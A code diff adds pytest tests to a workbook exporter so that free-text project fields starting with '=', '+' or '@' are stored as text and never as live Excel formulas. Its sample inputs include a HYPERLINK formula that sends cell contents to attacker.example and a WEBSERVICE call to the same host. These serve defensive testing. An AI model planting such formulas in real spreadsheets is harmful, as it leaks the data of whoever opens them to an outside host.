@@ -13,6 +13,7 @@ from __future__ import annotations
 
 import datetime as dt
 import json
+import zipfile
 from pathlib import Path
 from typing import Any, Final
 
@@ -230,3 +231,89 @@ def test_a_workbook_missing_a_field_row_is_refused(
     book.save(path)
     with pytest.raises(ValueError, match=r"asset\.netCapacityFactor"):
         read_workbook(path)
+
+
+# --------------------------------------------------------------------------
+# A workbook must not turn a project's own text into a formula
+# --------------------------------------------------------------------------
+
+FORMULA_FIELDS: Final = (
+    '=HYPERLINK("http://attacker.example/"&A1,"Open me")',
+    "=1+1",
+    '=WEBSERVICE("http://attacker.example")',
+    "@SUM(A1:A9)",
+    "+1+1",
+)
+"""Strings a schema-valid project may legitimately carry in a free-text field.
+
+`name` is 1-120 characters of free text, and `preparedBy`, `modelVersion` and
+every provenance `note` are likewise. Nothing in the schema forbids a leading
+`=`, and nothing should: it is a plausible thing to type.
+"""
+
+
+def poisoned(template: dict[str, Any], value: str) -> dict[str, Any]:
+    edited = json.loads(json.dumps(template))
+    edited["name"] = value
+    edited["provenance"]["preparedBy"] = value
+    edited["provenance"]["modelVersion"] = value
+    edited["provenance"]["fields"]["grid"]["note"] = value
+    return edited
+
+
+@pytest.mark.parametrize("value", FORMULA_FIELDS)
+def test_project_text_is_never_written_as_a_formula(
+    template: dict[str, Any], tmp_path: Path, value: str
+) -> None:
+    """openpyxl infers a formula from a leading `=`; exported text must stay text.
+
+    Left inferred, exporting an ingested project writes a live formula that Excel
+    evaluates when an analyst opens the workbook -- `HYPERLINK` and the
+    `WEBSERVICE` family reach the network -- and the cell stops round-tripping as
+    the text it was.
+    """
+    edited = poisoned(template, value)
+    ProjectFile.model_validate(edited)
+    path = write_workbook(edited, tmp_path / "poisoned.xlsx")
+
+    book = load_workbook(path)
+    for sheet in ("Identity", "Assumptions", "Provenance", "Statements"):
+        for row in book[sheet].iter_rows():
+            for cell in row:
+                assert cell.data_type != "f", f"{sheet}!{cell.coordinate} is a formula"
+
+
+@pytest.mark.parametrize("value", FORMULA_FIELDS)
+def test_formula_like_text_still_round_trips(
+    template: dict[str, Any], tmp_path: Path, value: str
+) -> None:
+    edited = poisoned(template, value)
+    returned = read_workbook(write_workbook(edited, tmp_path / "poisoned.xlsx"))
+    assert returned == edited
+
+
+def test_no_formula_reaches_the_stored_xml_outside_tieouts(
+    template: dict[str, Any], tmp_path: Path
+) -> None:
+    """Checked in the file itself, not only through openpyxl's own reader.
+
+    `TieOuts` is the one sheet that is meant to carry formulas -- it builds its
+    own, from the layout, and none of them contain project text.
+    """
+    path = write_workbook(poisoned(template, "=1+1"), tmp_path / "poisoned.xlsx")
+    archive = zipfile.ZipFile(path)
+    names = {
+        sheet: archive.read(f"xl/worksheets/sheet{index}.xml").decode("utf-8")
+        for index, sheet in enumerate(SHEETS, start=1)
+    }
+    for sheet, xml in names.items():
+        assert ("<f>" in xml) is (sheet == "TieOuts"), sheet
+
+
+def test_the_tieouts_sheet_keeps_its_formulas(template: dict[str, Any], tmp_path: Path) -> None:
+    """The fix must not disarm the workbook's own proof of itself."""
+    book = load_workbook(write_workbook(template, tmp_path / "t.xlsx"))
+    sheet = book["TieOuts"]
+    assert sheet.cell(2, 4).data_type == "f"
+    assert sheet.cell(15, 2).data_type == "f"
+    assert str(sheet.cell(2, 3).value).startswith("=IF(B")
